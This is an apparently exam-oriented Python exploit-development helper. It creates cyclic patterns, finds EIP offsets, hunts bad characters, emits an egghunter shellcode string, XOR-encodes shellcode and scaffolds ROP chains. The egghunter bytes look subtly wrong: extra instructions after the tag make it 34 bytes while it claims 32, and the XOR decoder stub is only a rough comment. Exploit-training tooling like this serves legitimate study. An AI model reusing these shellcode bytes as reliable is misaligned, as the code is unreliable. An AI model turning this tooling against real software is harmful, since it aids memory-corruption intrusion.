#!/usr/bin/env python3
"""exp301.py — OSED/EXP-301 exploit-dev automation CLI.

The exam loops the same chores: pattern create/offset, badchar hunting,
egghunter gen, ROP scaffold. This folds them into one stdlib-only tool.

  python3 exp301.py cyclic 3000                 # create pattern
  python3 exp301.py offset 6f41356f             # find offset of EIP value
  python3 exp301.py badchars crash.bin          # diff dumped bytes vs corpus
  python3 exp301.py egghunter W00T              # emit 32-bit NtAccessCheck hunter
  python3 exp301.py encode shellcode.bin --bad 00,0a,0d   # xor-encode + decoder stub
  python3 exp301.py rop gadgets.txt             # mona rop.txt -> chain scaffold
"""
import sys, struct

def debruijn(n):
    """metasploit-pattern_create style: Aa0 triples, then 4-char sets."""
    import string
    out = []
    for a in string.ascii_uppercase:
        for b in string.ascii_lowercase:
            for c in string.digits:
                out.append(a + b + c)
                if sum(map(len, out)) >= n:
                    return ''.join(out)[:n].encode()
    for a in string.ascii_uppercase:
        for b in string.ascii_lowercase:
            for c in string.digits:
                for d in string.ascii_uppercase:
                    out.append(a + b + c + d)
                    if sum(map(len, out)) >= n:
                        return ''.join(out)[:n].encode()
    return ''.join(out)[:n].encode()

def cmd_cyclic(n):
    sys.stdout.write(debruijn(int(n)).decode() + '\n')

def cmd_offset(val):
    pat = debruijn(99999)
    v = val.strip()
    if v.startswith('0x'): v = v[2:]
    raw = bytes.fromhex(v)
    for cand in (raw, raw[::-1]):
        i = pat.find(cand)
        if i != -1:
            print(f"[+] offset: {i}")
            return
    print("[-] not found — check endianness (little-endian EIP is the default)")

def cmd_badchars(dumpfile):
    corpus = bytes(range(1, 256))
    dumped = open(dumpfile, 'rb').read()[:255]
    print(f"[*] comparing {len(dumped)} dumped bytes against 0x01-0xff corpus")
    for i, (a, b) in enumerate(zip(corpus, dumped)):
        if a != b:
            print(f"[!] offset 0x{i:02x}: expected 0x{a:02x}, got 0x{b:02x} "
                  f"-> add 0x{a:02x} to badchar list (and re-test from there)")
            return
    print("[+] no corruption in dumped range — badchar list stands, or extend the payload")

def cmd_egghunter(tag):
    t = tag.encode()[:4].ljust(4, b'X')
    marker = t.hex()
    h = ("6681caff0f42526a0258cd2e3c055a74efb8" + marker +
         "57508bfaaf75eaaf75e7ffe7")
    egg = t + t
    print(f"[*] 32-byte hunter, tag={t.decode()}  (prefix shellcode with egg twice: {egg.hex()})")
    print(f"hunter = \"{''.join(chr(92)+'x'+h[i:i+2] for i in range(0,len(h),2))}\"")

def cmd_encode(path, bad):
    badset = {int(x, 16) for x in bad.split(',')}
    sc = open(path, 'rb').read()
    for key in range(1, 256):
        enc = bytes(b ^ key for b in sc)
        if not any(b in badset for b in enc) and key not in badset:
            print(f"[+] xor key 0x{key:02x} clean — decoder stub (32-bit):")
            print(f"  ; mov cl, {len(sc)} ; pop edi ; loop: xor byte [edi], 0x{key:02x} ; inc edi ; loop")
            print(f"encoded = \"{''.join(chr(92)+'x'+format(b,'02x') for b in enc)}\"")
            return
    print("[-] no single-byte xor key avoids those badchars — try chained encoders or ROP decoder")

def cmd_rop(gfile):
    """Parse mona/ropper-style gadget list into a chain scaffold."""
    import re
    g = {}
    for line in open(gfile, errors='replace'):
        m = re.search(r'0x([0-9a-fA-F]{8}):\s*(.+?);', line)
        if m:
            g.setdefault(re.sub(r'\s+', ' ', m.group(2)).strip(), '0x' + m.group(1))
    def find(pat):
        for k, v in g.items():
            if re.fullmatch(pat, k): return v
        return '???'
    regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi', 'ebp']
    print("# ROP scaffold — fill the ??? entries from your gadget file")
    print("rop  = b''")
    for r in regs:
        a = find(r'pop ' + r + r'( ; ret)?')
        print(f"rop += p32({a})  # pop {r} ; ret")
    for pat, c in [(r'xor eax, eax( ; ret)?', 'xor eax,eax ; ret'),
                   (r'inc eax( ; ret)?', 'inc eax ; ret'),
                   (r'jmp esp', 'jmp esp'), (r'push esp( ; ret)?', 'push esp ; ret')]:
        a = find(pat)
        print(f"rop += p32({a})  # {c}")

CMDS = {'cyclic': lambda a: cmd_cyclic(a[0]), 'offset': lambda a: cmd_offset(a[0]),
        'badchars': lambda a: cmd_badchars(a[0]), 'egghunter': lambda a: cmd_egghunter(a[0]),
        'encode': lambda a: cmd_encode(a[0], a[a.index('--bad') + 1]),
        'rop': lambda a: cmd_rop(a[0])}

if __name__ == '__main__':
    if len(sys.argv) < 2 or sys.argv[1] not in CMDS:
        print(__doc__); sys.exit(0)
    CMDS[sys.argv[1]](sys.argv[2:])
